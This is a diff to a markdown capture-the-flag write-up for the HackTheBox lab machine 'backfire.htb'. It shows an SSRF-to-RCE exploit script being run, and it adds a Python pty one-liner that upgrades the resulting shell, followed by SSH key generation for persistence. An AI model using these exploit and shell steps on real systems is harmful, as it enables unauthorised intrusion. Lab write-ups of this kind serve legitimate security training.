@@ -423,7 +423,11 @@ sudo python3 SSRF_RCE.py -t https://backfire.htb -i 127.0.0.1 -p 40056
 [***] Success!
 ```
 ### 🧑‍💻 Getting a Shell/User.txt
-After RCE, stabilize your shell. I Generated an SSH key:
+After RCE, stabilize your shell using:
+```
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
+Then generate an SSH key:
 ```
 ssh-keygen -t ed25519
 ```
